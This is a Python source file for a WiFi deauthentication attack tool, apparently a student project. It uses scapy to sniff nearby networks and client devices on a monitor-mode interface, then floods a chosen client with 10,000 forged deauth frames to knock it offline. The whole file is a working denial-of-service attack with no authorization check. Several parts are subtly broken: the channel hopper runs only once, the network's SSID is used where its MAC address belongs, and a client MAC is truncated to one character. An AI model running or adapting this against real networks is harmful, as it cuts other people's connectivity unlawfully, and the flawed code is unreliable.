import os
from scapy.all import *
from threading import Thread
import pandas
import time
import netifaces


# global variables
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)
macs = dict()
interface = ""
network_mac = ""
devices_macs = dict()
victim_mac = ""
i2 = 0
tic = time.perf_counter()
ch = 1


def main():
    global victim_mac
    global network_mac
    global interface
    os.system("clear")

    # welcome screen 5 sec(for fun)
    print('          ##############################################################\n'
          '          #                                                            #\n'
          '          #               deauthantication attack program              #\n'
          '          #        by: mohamad assi, oday mahamed, medhat smar         #\n'
          '          ######################## please wait #########################\n')
    items = list(range(0, 5))
    # Initial call to print 0% progress
    printProgressBar(0, len(items), prefix='Please wait:', suffix='to start', length=50)
    for i, item in enumerate(items):
        time.sleep(1)
        printProgressBar(i + 1, len(items))
    os.system("clear")
    ######################################

    # get interface and change it to mode monitor
    interface_names = netifaces.interfaces()  # get interfaces
    interfaces_length = str(len(interface_names) - 1) + ""
    print("\npress 0 - ", interfaces_length, " to choose the WIFI interface you want to perfume attack:\n\n")
    for i in range(0, len(interface_names)):
        print(i, ":", interface_names[i])
    interface_index = input("\nchoose the WIFI interface (press 0 - " + interfaces_length + "): ")
    while '0' > str(interface_index) or str(interface_index) > interfaces_length:  # if the user chose wrong number
        interface_index = input("\n\nERROR: please press 0 - " + interfaces_length + " from the interfaces list:")
    interface = interface_names[int(interface_index)]
    MonitorMode(interface)

    # change interface wifi channel
    os.system("clear")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # print wifi networking
    items = list(range(0, 5))
    printProgressBar(0, len(items), prefix='Please wait:', suffix='to start', length=50)
    os.system("clear")
    print("\n\n                    searching for wifi networks - time: 1min\n")

    global tic
    tic = time.perf_counter()
    loading_min1 = Thread(target=loading_min)
    loading_min1.start()

    sniff(prn=callback, iface=interface, timeout=60)
    os.system("clear")

    print_all_networks()
    print_all_devices()

    # ATTACK
    victim_mac = victim_mac.lower()
    network_mac = network_mac.lower()
    dot11 = Dot11(type=0, subtype=12, addr1=victim_mac, addr2=network_mac, addr3=network_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.1, count=10000, iface=interface, verbose=1)


# Print iterations progress
def printProgressBar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█', printEnd="\r"):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print('                ' + bar, end='\r')
    # Print New Line on Complete
    if iteration == total:
        print()


def callback(packet):
    if packet.haslayer(Dot11Elt) and packet.type == 0 and packet.subtype == 8:
        if packet.addr2 not in macs.keys():
            macs[packet.addr2] = packet.info.decode("utf-8")
    if packet.haslayer(Dot11) and packet.getlayer(Dot11).type == 2 and not packet.haslayer(EAPOL):
        client_mac_address = packet.addr2
        ap_mac_address = packet.addr3
        if ap_mac_address in macs.keys():
            if client_mac_address not in (devices_macs.keys() or macs.keys()):
                if client_mac_address != ap_mac_address:
                    devices_macs[client_mac_address] = macs[ap_mac_address]


def print_all_networks():
    global network_mac

    print("Which network you are willing to use: ( press 0 - ", len(macs) - 1, ")")
    k = 0
    for network in macs:
        print(k, "-", str(macs[network]) + "\t" + str(network))
        k += 1
    net = input()
    k = 0
    for network in macs:
        if k == int(net):
            chosen_victim = str(macs[network])
            break
        k += 1
    network_mac = chosen_victim


# print_all_devices function to display to the user the devices in the network
def print_all_devices():
    global devices_macs
    global victim_mac
    clients_count = 0
    if len(devices_macs) == 0:
        print("there are no devices available\n")
        exit()
    else:
        os.system("clear")
        for client in devices_macs:
            try:
                if devices_macs[client] == macs[victim_mac]:
                    clients_count += 1
                    print(client + "\n")
            except:
                continue
        if clients_count == 0:
            print("there are no devices available\n")
            exit(0)
        device = input("Which device you are willing to attack: ( press 0 - " + str(len(devices_macs) - 1) + ")")
        try:
            victim_mac = list(devices_macs)[int(device)][0]
        except:
            print("ERROR in wrong victim")
        print("Attacking", victim_mac, "device")


# change_channel function to go all over the wi-fi channels
def change_channel():
    global ch
    os.system("iwconfig " + interface + " channel " + str(ch))
    # switch channel from 1 to 14 each 0.5s
    ch = ch % 14 + 1
    time.sleep(0.5)


def loading_min():
    toc = time.perf_counter()
    timerr = tic - toc
    while timerr < 60:
        toc = time.perf_counter()
        timerr = toc - tic
        if timerr > 60:
            return
        global i2
        i2 = i2 + 1
        printProgressBar(i2, 60)
        time.sleep(1)


# turn on monitor mode
def MonitorMode(interface_name):
    try:
        os.system("bash run_monitor_mode.sh " + interface_name)
    except:
        print("ERROR: make sure that", interface_name, "interface can be changed to Monitor Mode.")
        sys.exit(0)


if __name__ == "__main__":
    main()
